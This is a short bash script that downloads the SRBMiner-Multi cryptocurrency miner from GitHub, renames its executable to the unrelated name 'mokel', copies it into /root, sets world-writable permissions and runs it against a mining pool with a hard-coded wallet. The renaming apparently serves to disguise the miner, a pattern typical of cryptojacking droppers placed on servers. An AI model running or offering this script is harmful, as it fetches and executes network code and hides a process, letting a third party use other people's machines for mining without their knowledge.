#!/bin/bash

# Download SRBMiner-Multi
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz

# Extract the downloaded tarball
tar -xf SRBMiner-Multi-2-4-7-Linux.tar.xz

# Rename the extracted directory
mv SRBMiner-Multi-2-4-7 srb

# Navigate to the renamed directory
cd srb

# Rename the SRBMiner-MULTI executable
mv SRBMiner-MULTI mokel

# Copy the renamed executable to the /root directory
cp -r mokel /root

# Change permissions of the executable
chmod 777 mokel

# Execute the miner with specified parameters
./mokel --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.vps1

